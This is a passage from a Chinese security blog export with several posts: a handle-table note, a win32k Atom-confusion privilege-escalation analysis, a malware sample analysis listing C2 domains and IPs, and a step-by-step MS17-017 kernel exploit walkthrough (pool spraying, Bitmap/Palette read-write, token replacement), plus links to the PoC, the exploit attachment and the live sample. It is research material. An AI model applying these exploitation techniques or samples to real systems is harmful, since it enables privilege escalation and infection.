<h2 id="进程内部句柄表"><a href="#进程内部句柄表" class="headerlink" title="进程内部句柄表"></a>进程内部句柄表</h2><p>&ensp;&ensp;&ensp;&ensp;进程内部句柄表指针存储在进程_EPROCESS结构的ObjectTable成员中：

<p><img src="%E5%9B%BE6.jpg" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;可以使用API函数ZwQuerySystemInformation获取所有进程打开的内核对象句柄，参数需要设置成SystemHandleInformation，注意得到的是全部进程的全部内核对象句柄，得到存放句柄信息的缓冲区之后需要根据PID值确定句柄值属于哪个进程。

<p><img src="%E5%9B%BE7.jpg" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;在使用ZwQuerySystemInformation时还有个小问题，在获取句柄信息时无法事先获取全部内核对象的大小，所以现在一般都采用上图中循环申请内存，如果缓冲区大小不匹配则返回值是STATUS_INFO_LENGTH_MISMATCH，最后在该错误不再出现时即为缓冲区大小符合要求，函数执行成功。（俺之前好奇Process Explorer的搜索句柄功能是咋实现的，后来看网上有分析说Process Explorer也是用了该函数获取句柄值的部分，Win8及以上系统上还不一定支持该函数，暂未确认了~~）

]]></content>
      <categories>
        <category>系统内核</category>
      </categories>
      <tags>
        <tag>内核原理</tag>
        <tag>系统机制</tag>
      </tags>
  </entry>
  <entry>
    <title>2016-01-17-Atom截胡-CVE-XX-XX内核提权漏洞分析</title>
    <url>/2016/01/17/2016-01-17-Atom%E6%88%AA%E8%83%A1-CVE-XX-XX%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote>
<p>&ensp;&ensp;&ensp;&ensp;原文以前首发到安全客了，这里备份一下，前几天上网鬼混的时候发现了Rookitsmm的Github上分享的一个提权漏洞Poc：
</blockquote>
<p><img src="1.png" alt=""></p>
<blockquote>
<p>&ensp;&ensp;&ensp;&ensp;Poc下载地址：https://github.com/Rootkitsmm/CVEXX-XX
<p>&ensp;&ensp;&ensp;&ensp;Rookitsmm的说明中描述了漏洞触发的位置，可以达到任意地址减一的效果，最初见到崩溃地址的时候还以为是CVE-2015-2360，不过翻了翻提供的Poc并未发现有与2360相关的东西，遂动手简单分析了下，如果分析过程存在问题，欢迎联系我的邮箱交流指正（回复时间可能较晚请见谅）。
</blockquote>
<a id="more"></a>
<h2 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h2><p>&ensp;&ensp;&ensp;&ensp;搭建Windbg+纯净Win7x32虚拟机调试环境，执行编译后的Poc程序（poc中注释了申请0页内存的函数，分析漏洞成因时可以保留注释，待分析漏洞利用时取消注释），触发内存访问异常：

<p><img src="2.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;下面查看win32k.sys中esi寄存器值的来源为*(edi+0xb0)：

<p><img src="3.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;继续查看edi寄存器的来源：

<p><img src="4.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;可以看出edi寄存器的值来自xxxCreateWindowEx的返回值，该返回值一般是指向一个tagWND结构体的指针，在32位Win7系统下tagWND结构体的大小为0xb0，但是此处的xxxCreateWindowEx是由xxxTrackPopupMenuEx函数调用，通过对xxxTrackPopupMenuEx调用xxxCreateWindowEx函数创建窗体过程的分析，在xxxTrackPopupMenuEx函数中调用xxxCreateWindowEx的返回值实际是tagMENUWND结构体指针（tagMENUWND包含tagWND和一个4字节的tagPOPUPMENU指针，但是tagMENUWND这个结构的符号本身没有导出），所以xxxTrackPopupMenuEx调用的xxxCreateWindowEx正常情况下会为窗体分配0xb4字节空间，再回头看系统崩溃的原因是因为访问tagWND结构0xb0之后四字节的数据(即*(edi+0xb0))，据此判断是xxxCreateWindowEx中出现的问题。
<p>&ensp;&ensp;&ensp;&ensp;通过对xxxCreateWindowEx函数进行分析，找到HMAllocObject申请空间的代码：

<p><img src="5.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;UlongAdd函数实现其实是一个简单的相加，第一个参数为0xb0，正是一个tagWND结构的大小：

<p><img src="6.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;正常情况下UlongAdd函数会将tagWND结构的大小加上另一个值再申请内存空间，通过对v23变量的来源进行分析，这部分的简略流程为通过UserFindAtom函数找到需要注册窗体的窗体类对应的Atom值v21，再通过GetClassPtr函数找到该Atom对应的窗体类tagCLS结构体指针的指针v22，最终得到窗体的tagCLS结构体指针v23，根据该结构创建并初始化窗体，所以v23+0x60实际对应窗体类tagCLS的cbwndExtra成员：

<p><img src="7.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;对调用GetClassPtr函数处后一条指令下断，并对比正常程序创建弹出菜单时调用GetClassPtr函数的返回值可以很容易确定poc程序GetClassPtr函数返回值存在的问题。正常程序（左）及Poc程序（右）：

<p><img src="8.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;poc中xxxCreateWindowEx调用GetClassPtr并未得到正确的tagCLS结构体指针的指针（说着好绕…），导致cbwndExtra成员值为0， 经分析该错误指针来源，该指针实际指向poc程序中事先注册的窗体类（THIS_CLASSNAME为poc中的宏定义"#32768"）：

<p><img src="9.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;注意poc程序注册窗体类的过程中设置的lpszClassName，其值#32768是和正常程序调用xxxTrackPopupMenuEx创建窗体时注册的类名是相同的（参考对比图），这个类名#32768在被程序添加到Atom Table的时候，因为32768小于0xBFFF，实际添加到Atom Table的是其十六进制值0x8000，看到这里大家应该就可以猜到这个漏洞的触发关键之处，主要在于注册窗体类名#32768混淆GetClassPtr函数，在xxxCreateWindowEx根据Atom值调用GetClassPtr函数查询菜单窗体类时，实际返回的是poc程序中注册#32768类名对应的tagCLS结构体指针的指针，除此之外poc程序中还设置了cbwndExtra成员为0，这个值一般默认也是初始化为0的，这也就能解释xxxTrackPopupMenuEx创建窗体的时候并未申请0xb4字节的成因，正常程序在xxxTrackPopupMenuEx创建窗口的过程中cbwndExtra成员值为0x4，为窗体申请空间的时候会先调用UlongAdd函数将该值与tagWND的0xb0大小相加，申请完毕之后再对这0x4字节进行菜单相关的初始化工作，poc程序中设置该值为0，并且在GetClassPtr函数时将本来正常返回的菜单窗体类截胡了，返回的值实际是poc程序中RegisterClassEx注册的窗体类，最终造成崩溃位置处指令对0xb0后四字节的内存访问异常。
<p>&ensp;&ensp;&ensp;&ensp;到了这里就还剩最后一个问题：GetClassPtr函数为什么会被poc程序中设置的类名#32768混淆，返回错误的指针，我们来看一看GetClassPtr函数的实现过程：

<p><img src="10.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;GetClassPtr函数的第一个参数a1为上文提到的UserFindAtom函数返回值Atom变量v21，数值等于0x8000，在调用GetClassPtr函数时程序中存在poc程序通过RegisterClassEx注册的和xxxTrackPopupMenuEx函数注册的两个Atom值等于0x8000的窗体类， GetClassPtr第一次调用_InnerGetClassPtr函数后是在pclsPrivateList中搜索，返回的是poc程序通过RegisterClassEx的tagCLS结构体指针的指针：

<p><img src="11.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;这里我们修改_InnerGetClassPtr返回值为0，让程序继续进行第二次调用_InnerGetClassPtr函数，即在pclsPublicList列表中搜索，返回值则是正确的tagCLS结构指针的指针：

<p><img src="12.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;至此可以确认漏洞成因是根据GetClassPtr函数搜索窗体结构列表的顺序不同，在第一次执行_InnerGetClassPtr函数的时候抢先将poc中RegisterClassEx注册的tagCLS结构体指针的指针返回，最终导致后续调用HMAllocObject申请内存时少了四字节空间，造成内存越界访问。

<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>&ensp;&ensp;&ensp;&ensp;虽然现在已经触发内存越界访问，但是创建窗体时申请的0xb0字节内存区域后四字节并不受控制，比较幸运的一点是RtlAllocateHeap申请这0xb0字节时还会对该区域后四字节进行一些赋值修改，最终这四字节的值一般稳定在0x100以下（0x100是我这边测试的结果，下图中ax寄存器的值一般比较小）：

<p><img src="13.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;poc中使用类似UAF占位的做法申请0页内存，进而达到控制执行流程到任意地址减1效果（xxxTrackPopupMenuEx->HMAssignmentLock->HMUnlockObject）。
<p>&ensp;&ensp;&ensp;&ensp;xxxTrackPopupMenuEx：

<p><img src="14.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;HMAssignmentLock：

<p><img src="15.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;HMUnlockObject：

<p><img src="16.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;到了这一步就很好利用了，可以仿照CVE-2015-2360的做法（开始我也是看到这个任意地址减指令所在位置误以为是这个洞…），通过多次任意地址减，将窗体的bServerSideWindowProc标志置一即可。

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>&ensp;&ensp;&ensp;&ensp;这个洞的成因还是很有意思的，Poc的作者Rootkitsmm最后也提到微软补丁用safe_cast_fnid_to_pMENUWND函数检查xxxCreateWindowEx的返回值，我们来看一下这个函数的实现：

<p><img src="17.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;上文中正常程序和poc的tagCLS结构对比图里也圈了下fnid成员，在创建窗体时tagMENUWND结构体中该值不会被更改，所以虽然我们还能继续用我们自己注册的Atom截胡，但是无法修改fnid成员的值也就无法通过这个函数检查，后面的漏洞利用过程就失效了，至于还存不存在其它可能劫持Atom Table的搜索过程，返回伪造的tagCLS等结构，就需要更多时间去继续挖掘了。
]]></content>
      <categories>
        <category>漏洞利用</category>
      </categories>
      <tags>
        <tag>内核原理</tag>
        <tag>内核漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>2017-09-30-深入剖析：利用Flash漏洞传播的小马样本分析</title>
    <url>/2017/09/30/2017-09-30-%E6%B7%B1%E5%85%A5%E5%89%96%E6%9E%90%EF%BC%9A%E5%88%A9%E7%94%A8Flash%E6%BC%8F%E6%B4%9E%E4%BC%A0%E6%92%AD%E7%9A%84%E5%B0%8F%E9%A9%AC%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<blockquote>
<p>&ensp;&ensp;&ensp;&ensp;原文以前首发到安全客了，这里备份一下，这是一个利用Flash漏洞CVE-2015-8651进行传播的病毒程序，关于这个Flash漏洞网上已经有了详细的分析报告，这里关注下利用这个漏洞进行传播的样本行为、通信加密方式等。
</blockquote>
<a id="more"></a>
<h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><p>&ensp;&ensp;&ensp;&ensp;样本基本文件信息如下：

<p><img src="0.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;首先通过对样本进行静态分析发现，该样本本身采用了大量的函数间接跳转、字符串混淆等措施：

<p><img src="1.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;除此之外，样本还对病毒主题代码进行了内存解析执行的方式，使用静态分析方式无法定位到样本的关键代码，极大的增加了代码静态分析的难度，所以主要通过调试分析其恶意行为。

<h2 id="样本行为分析"><a href="#样本行为分析" class="headerlink" title="样本行为分析"></a>样本行为分析</h2><h3 id="内存解析执行关键代码"><a href="#内存解析执行关键代码" class="headerlink" title="内存解析执行关键代码"></a>内存解析执行关键代码</h3><p>&ensp;&ensp;&ensp;&ensp;样本首先将本身打包的病毒主题代码重新解密拷贝到自身的运行空间，然后使用内存解析执行方式获取实际运行需要的导入表函数地址，对其代码空间中引用的函数地址进行修复：

<p><img src="2.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;最终执行的代码如下图所示：

<p><img src="3.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;可以看到，病毒主题代码也经过了大量的代码混淆操作，给调试过程增加了很大的难度。

<h3 id="注入msiexec进程"><a href="#注入msiexec进程" class="headerlink" title="注入msiexec进程"></a>注入msiexec进程</h3><p>&ensp;&ensp;&ensp;&ensp;解密出的样本主功能代码首先创建msiexec.exe进程，msiexec.exe为系统进程，是Windows Installer的一部分。用于安装Windows Installer安装包（MSI），此处病毒样本用于伪装自身恶意代码到合法进程中，并将下一步劫持进程后运行的病毒Shellcode注入到该进程空间：

<p><img src="4.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;替换其进程OEP处代码用于加载解析执行病毒Shellcode部分，下图所示为被替换之后的msiexec.exe进程入口点代码：

<p><img src="5.png" alt=""></p>
<h3 id="模糊API调用"><a href="#模糊API调用" class="headerlink" title="模糊API调用"></a>模糊API调用</h3><p>&ensp;&ensp;&ensp;&ensp;注入到msiexec.exe进程的病毒Shellcode代码首先根据保存的API名称Hash值获取到后续调用的API函数地址，然后判断API函数入口点代码类型判断是否需要对其进行间接调用：

<p><img src="6.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;构造API函数入口代码，增加了调用某些敏感API函数的隐蔽性，导致一些API入口断点及API Hook检测机制失效：

<p><img src="7.png" alt=""></p>
<h3 id="检测虚拟机进程"><a href="#检测虚拟机进程" class="headerlink" title="检测虚拟机进程"></a>检测虚拟机进程</h3><p>&ensp;&ensp;&ensp;&ensp;通过调用CreateToolHelp32Snapshot系列函数等枚举进程：

<p><img src="8.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;根据进程名称算出CRC值进行判断检查是否在虚拟机内，如果检测到运行环境不适合则选择持续调用Sleep函数暂停进程运行，如下图中虚拟机中vmtools进程被检测到：

<p><img src="9.png" alt=""></p>
<h3 id="设置自启动"><a href="#设置自启动" class="headerlink" title="设置自启动"></a>设置自启动</h3><p>&ensp;&ensp;&ensp;&ensp;该样本首先向“C:\Users\用户名\AppData\Roaming”目录下复制自身，复制的文件名为WindowsSidebarT.exe，用于伪装成Win7操作系统的小工具进程：

<p><img src="10.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;最终设置注册表项完成自启动行为：

<p><img src="11.png" alt=""></p>
<h3 id="查询Windows-Defender等设置"><a href="#查询Windows-Defender等设置" class="headerlink" title="查询Windows Defender等设置"></a>查询Windows Defender等设置</h3><p>&ensp;&ensp;&ensp;&ensp;通过服务及注册表设置情况查询Windows Defender反间谍软件的配置情况：

<p><img src="12.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;设置关闭Windows Defender服务：

<p><img src="13.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;执行完毕该部分代码之后可以看到服务被禁用：

<p><img src="14.png" alt=""></p>
<h3 id="主机信息搜集"><a href="#主机信息搜集" class="headerlink" title="主机信息搜集"></a>主机信息搜集</h3><p>&ensp;&ensp;&ensp;&ensp;获取系统盘信息：

<p><img src="15.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;获取用户登录信息：

<p><img src="16.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;获取系统信息：

<p><img src="17.png" alt=""></p>
<h3 id="文件校验"><a href="#文件校验" class="headerlink" title="文件校验"></a>文件校验</h3><p>&ensp;&ensp;&ensp;&ensp;读取磁盘上的文件并计算其MD5值，最终该MD5值将被发送到木马控制端，猜测是用来对木马回连信息进行认证以及木马服务端校验：

<p><img src="18.png" alt=""></p>
<h2 id="通信流程分析"><a href="#通信流程分析" class="headerlink" title="通信流程分析"></a>通信流程分析</h2><h3 id="木马回连过程"><a href="#木马回连过程" class="headerlink" title="木马回连过程"></a>木马回连过程</h3><p>&ensp;&ensp;&ensp;&ensp;首先解析回连域名pationare.bit绑定的IP地址（该样本中存在备用域名avaneredge.bit），并连接域名解析结果中的IP地址进行建连操作：

<p><img src="19.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;目前发现域名pationare.bit绑定了54.213.220.57、54.148.88.132、49.51.35.142这三个IP地址，备用域名avaneredge.bit也绑定了54.213.220.57。除此之外样本还会从保存的IP地址列表中随机选取进行连接尝试，但在针对该样本的分析过程中样本均未能与该IP列表中的地址成功建立连接，疑似其备用的C&C服务器：

<p><img src="20.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;成功与C&C服务器建立连接之后，样本采用Http协议与控制端进行通信，用于隐藏通信流量：

<p><img src="21.png" alt=""></p>
<h3 id="通信数据加密流程"><a href="#通信数据加密流程" class="headerlink" title="通信数据加密流程"></a>通信数据加密流程</h3><p>&ensp;&ensp;&ensp;&ensp;样本主要采用简单异或及变异的AES算法对通信过程进行加密，向控制端主机发送的信息主要包括主机名、程序MD5值、进程列表等：

<p><img src="22.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;样本首先填充发送数据的前0x14字节为随机值，然后将发送数据的每个字节逐个与前一个字节进行异或：

<p><img src="23.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;后续即采用ECB模式、128bit分组的变异AES算法进行加密，首先从数据中解密出变异AES算法使用的密钥，并进行秘钥扩展（密钥扩展算法和标准AES有区别，下图第一行0x10字节即加密密钥，全部0xB0字节即为密钥扩展的结果）：

<p><img src="24.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;填充需要加密的数据长度为分组长度的整数倍，该样本的填充算法为在需要填充n个字节的情况下随机生成n-1个字节填充，最后一个字节使用0xn填充。最后进行加密：

<p><img src="25.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;加密结果再与Http协议头部进行组装发送：

<p><img src="26.png" alt=""></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>&ensp;&ensp;&ensp;&ensp;该样本的实现中使用了大量的代码混淆、模糊API调用等技术，通过一些API监控工具也没能得到其注入进程时调用的API信息，此外该样本还采取了一些常用的反调试反虚拟机技术对运行环境进行判断，给调试分析提升了很大的难度，整体功能如通信流量隐藏、传输加密等的实现也较为完善。

<p>样本下载：<a href="样本.7z" target="_blank">下载链接</a><br>解压密码：infected</p>
]]></content>
      <categories>
        <category>病毒样本</category>
      </categories>
      <tags>
        <tag>注入</tag>
        <tag>VM检测</tag>
        <tag>加密机制</tag>
      </tags>
  </entry>
  <entry>
    <title>2017-11-28-漏洞分析：MS17-017 Windows内核提权漏洞Exploit分析</title>
    <url>/2017/11/28/2017-11-28-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%9AMS17-017-Windows%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9EExploit%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<blockquote>
<p>&ensp;&ensp;&ensp;&ensp;原文以前首发到安全客了，这里备份一下，此次分析的内核提权漏洞为SENSEPOST的Saif El-Sherei在分析微软MS17-017补丁的时候发现的，该漏洞类型为win32k.sys驱动程序中处理GDI对象的函数EngRealizeBrush内发生的整型溢出，利用方式也比较经典，Saif El-Sherei在今年的Defcon会议上发布了一款针对Win7 Sp1 x86平台的Exploit，我就主要针对该Exploit进行了下简单的分析，如果分析过程存在问题，欢迎联系我交流指正。
</blockquote>
<a id="more"></a>
<h2 id="成因分析"><a href="#成因分析" class="headerlink" title="成因分析"></a>成因分析</h2><p>&ensp;&ensp;&ensp;&ensp;Saif是通过补丁比对分析的漏洞成因，为了便于分析漏洞成因，我们先把漏洞POC代码中的喷射及后续的利用代码去掉，只留能够触发蓝屏的代码（见附件中的poc.exe），运行poc程序触发蓝屏，通过分析蓝屏信息再一步步的定位漏洞触发成因（注意：poc.exe中设置了一个调试断点，在Windbg中触发之后设置了一个虚拟机快照，以后每次重新调试恢复快照重新连接Windbg即可，这样可以尽量使每次调试时的内存布局尽量稳定）：

<p><img src="1.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;查看栈回溯信息也可以看到是在ExFreePoolWithTag函数释放Pool时的故障：

<p><img src="2.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;查看0xfdec3168处的Pool信息：

<p><img src="3.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;根据Pooltag标识Gebr搜索到该Pool是在EngRealizeBrush函数中申请的：

<p><img src="4.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;其实根据这里的内存申请代码已经能够看出此处存在问题，PALLOCMEM函数参数中申请的空间大小为ebx+0x40h，即下图中反编译的代码中的v12+0x40，v12本身为无符号整型，所以申请的空间大小至少为0x40：

<p><img src="5.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;但是在之前查看0xfdec3168处的Pool信息中显示的Size为0x18（包含Pool 头部8字节，实际申请空间大小应为0x10）。可以证明此处申请内存时发生了整形溢出：

<p><img src="6.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;下面再啰嗦下查看蓝屏的成因，在PALLOCMEM函数返回处下断查看申请的Pool内存地址：

<p><img src="7.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;此处注意对比蓝屏时查看的0xfdec3168处Pool信息，可以发现蓝屏状态时0xfdec3178处显示的POOL_HEADER被破坏，在释放其链表的下一项0xfdec3160时导致其操作失败，下面再看下0xfdec3178地址处存放的数据是如何被覆盖的，触发写断点：

<p><img src="8.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;0xfdec3160处Pool大小为0x18字节，除去8字节的POOL_HEADER大小，实际的缓冲区只有0xfdec3168-0xfdec3178这0x10字节，但是明显可以看到此处被越界覆写，也就验证了EngRealizeBrush函数调用PALLOCMEM申请内存时申请空间过小，导致后续操作该处内存空间时发生了越界。
<p>&ensp;&ensp;&ensp;&ensp;下面来分析一下为什么PALLOCMEM函数会只申请0x10字节的内存，再来深入探究下其参数的来源：

<p><img src="9.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;来看下运行时的计算过程，下图中的乘法运算即v60*v68，最终结果还需要加上0x44（68），调用PALLOCMEM函数时再加上0x40：

<p><img src="10.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;此时edi寄存器的值以及ebp-18h的值均来自poc代码中CreateBitmap函数参数（HBITMAP bitmap = CreateBitmap(0x23, 0x1d41d41, 1, 1, NULL)）。最终的计算结果为0x23*0x20/(2^3)* 0x1d41d41=0xFFFFFF8C，在调用PALLOCMEM函数时又分别加上了0x44、0x40字节，0xFFFFFF8C+0x44+0x40= 0x100000010，正是在此整形溢出导致的实际申请内存时只申请了0x10字节，在EngRealizeBrush后续对申请的内存赋值时导致破坏了紧邻的Pool结构，最终触发蓝屏。

<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>&ensp;&ensp;&ensp;&ensp;该漏洞的利用过程还是比较精彩的，上文的poc中原作者已经构造好参数，控制最终申请0x10+0x8字节内存，能够越界覆写临近的Pool结构，为了完成提权过程可以使用多种利用方式，作者发布的Exploit使用的是混合利用Bitmap和Palette对象完成，首先控制在发生越界的SURFOBJ对象后面喷射两个相邻的Bitmap对象和Palette对象，利用越界覆写第一个Bitmap对象结构的sizlBitmap成员，获取相对地址读写权限，再利用被修改的Bitmap对象修改相邻的Palette对象的cEntries成员，继而控制这个Palette对象修改第二个Palette对象的pFirstColor成员，完成任意地址读写，替换当前进程的Token为SYSTEM进程的Token，整个利用过程也就完成了。

<ol>
<li>喷射<br>因为产生越界读写的SURFOBJ对象是在Paged Session Pool中分配的，对应的也需要利用它的特性完成喷射，第一次申请内存将首先占据内存页（0x1000字节大小）的开始部分，后续申请的内存则会从内存页的末尾开始向前排列（盗用Saif文章原图如下）：</li>
</ol>
<p><img src="11.png" alt=""><br>    具体做法如下：</p>
<ul>
<li>首先申请2000个0xFE8字节大小的空间，用于清理内存空间，内存页末尾留出0x18字节。</li>
<li>利用创建Windows窗体类时成员lpszMenuName，控制申请0x18字节内存占用上一步空出的0x18字节。虽然窗体类tagCLS是在Desktop Heap中分配内存，但是lpszMenuName却是在内核池中分配的。</li>
<li>释放第一步申请的0xFE8大小的空间，便于下一步布置相邻的Bitmap以及Palette对象。</li>
<li>依次申请0x7F8字节大小的Bitmap对象以及0x7E8字节大小的Palette对象，使相邻的这两个对象占据上一步释放的空间，关于如何确定内核中Bitmap对象申请的空间大小跟CreateBitmap函数的参数之间没有确定的公式，只能不断尝试，不过CreatePalette函数参数与对应的内核中申请空间的大小已经有公开的资料了。<br>e)    释放第二步申请的窗体类，这样最后0x18字节内存就变成为了Free状态，在漏洞触发时申请的0x18内存就落入了这些内存空洞之间。<p>&ensp;&ensp;&ensp;&ensp;下面将exploit代码中喷射的代码和利用的代码注释回来，重新开始调试exploit从堆喷到执行Shellcode的步骤，同时继续在PALLOCMEM运行完毕后下断，查看发生越界的SURFOBJ对象所在的内存地址以及喷射之后越界对象地址附近的内存布局：

</li>
</ul>
<p><img src="12.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;可以看到发生越界的SURFOBJ对象0xfd4a8ff0相邻的两个对象就是我们布局的一个Bitmap对象（0xfd4a9000）以及Palette对象（0xfd4a97f8），利用喷射完成内存地址的稳定布局之后就可以触发漏洞了。

<ol start="2">
<li>相对地址读写<p>&ensp;&ensp;&ensp;&ensp;实现相对地址读写的目的主要是能够利用只触发漏洞一次，完成从受限的越界写入转化成可以多次覆写其它更多地址的功能，注意漏洞触发时并非只有我们在分析漏洞成因的时候发现的越界覆写Pool Header，同时覆盖的还有相邻内存池的其它数据结构：

</li>
</ol>
<p><img src="13.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;在写exploit中我们主要关注*(_DWORD *)(v16 + 0x3C) = a3这段代码，除去发生越界的SURFOBJ对象缓冲区0x10字节以及相邻的Bitmap对象的Pool header0x8字节、_BASE_OBJECT 0x10字节，实际还会覆盖相邻的Bitmap对象的sizlBitmap结构的cy成员（0x3C-0x10-0x10-0x8=0x14）：

<p><img src="14.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;下面继续运行exploit覆盖该地址的数据，也可以使用windbg的gdiobjdump插件更方便的查看覆盖的数据格式，这里不再介绍了：

<p><img src="15.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;因为修改了Bitmap对象的sizlBitmap结构，现在就能利用Bitmap对象的GetBitmapBits、SetBitmapBits函数完成功能更容易操作的越界读写操作，因此也就拥有了喷射在与Bitmap对象紧邻的Palette对象数据结构的数据的操作能力，具体需要读写那些Palette对象成员可以研究下Palette对象的结构：

<p><img src="16.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;其中cEntries代表结构体末尾的 PALETTEENTRY数组的成员个数，pFirstColor指针则指向PALETTEENTRY数组的第一个成员的地址。下面通过利用上一步的Bitmap对象修改相邻Palette对象的cEntries为0xFFFFFFFF，就相当于是扩展了Palette对象操作的内存空间是pFirstColor指针指向的内存空间之后的任意地址。这部分流程也比较简单，首先从喷射的Bitmap对象中找到被漏洞触发越界覆写sizlBitmap结构的那个Bitmap对象，调用GetBitmapBits函数看看那个能越界就行，不再赘述。第二步根据喷射时Bitmap与Palette对象的位置关系，调用GetBitmapBits获取Bitmap对象的数据，定位到其中包含的Palette对象的cEntries成员，修改后调用SetBitmapBits函数重新写入，下图即为被修改前后的cEntries：

<p><img src="17.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;至此就被覆写cEntries的Palette对象就拥有相对地址读写的能力了。

<ol start="3">
<li>任意地址读写<p>&ensp;&ensp;&ensp;&ensp;虽然已经能够完成相对地址读写的能力，但是还是局限在特定的内存空间内，所以还需要再做一点手脚完成对任意地址内存空间的操纵能力，最终完成替换Token的操作。具体做法其实类似上一步骤覆写cEntries，这里只需要覆写pFirstColor指针即可，需要修改什么地址的内存将pFirstColor指针指向该地址就行了，首先也是先寻找到被修改cEntries结构的Palette对象，不再赘述。根据喷射的特点，每隔0x1000就存在一个喷射的Palette对象，直接调用SetPaletteEntries函数对下一个内存页的Palette对象pFirstColor成员进行修改即可：

</li>
</ol>
<p><img src="18.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;注意此处pFirstColor的值被修改为了0xfd4a8000，这个地址是第一步喷射时和发生越界的SURFOBJ对象在同一个内存页的Bitmap对象。设置成这个地址的目的是利用该地址处Bitmap对象的tag值Gh15做标示，再遍历所有喷射的Palette对象这个pFirstColor值被修改的Palette。

<p><img src="19.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;到此就已经具备任意地址读写的能力了，需要修改任意地址的内存只需利用被修改cEntries的Palette去再次修改第二个Palette的pFirstColor，再对其调用SetPaletteEntries、GetPaletteEntries函数读取或修改内存数据。

<ol start="4">
<li>Shellcode<p>&ensp;&ensp;&ensp;&ensp;进行到这里就可以松口气了，内核提权Shellcode目前一般都采用替换当前进程的Token为SYSTEM进程的Token，这里没有什么需要特别说的，首先获取当前进程和SYSTEM进程的EPROCESS结构地址，利用任意地址读写将SYSTEM进程的Token写入到当前进程的Token位置就完事了。提权成功：

</li>
</ol>
<p><img src="20.png" alt=""></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>&ensp;&ensp;&ensp;&ensp;微软最后在PALLOCMEM函数申请内存之前添加了ULongLongToULong函数做检测，如果发生了整形溢出不会跳转到申请内存的代码，已经被Patch的代码：

<p><img src="21.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;除了exp所使用的这种漏洞利用方式以外，Saif也提到了其它两种方式，一种是利用两个相邻的Bitmap对象完成，由一个Bitmap对象去覆写另一个Bitmap的pvScan0来完成任意地址读写，另一种方式是利用一个Bitmap直接去修改一个Palette对象的pFirstColor指针，有兴趣的湿敷可以尝试下。

<h3 id="附件"><a href="#附件" class="headerlink" title="附件"></a>附件</h3><p><a href="https://share.weiyun.com/d1ed23e7750d6a37e3db268ac9ad84ef" target="_blank" rel="noopener">https://share.weiyun.com/d1ed23e7750d6a37e3db268ac9ad84ef</a></p>
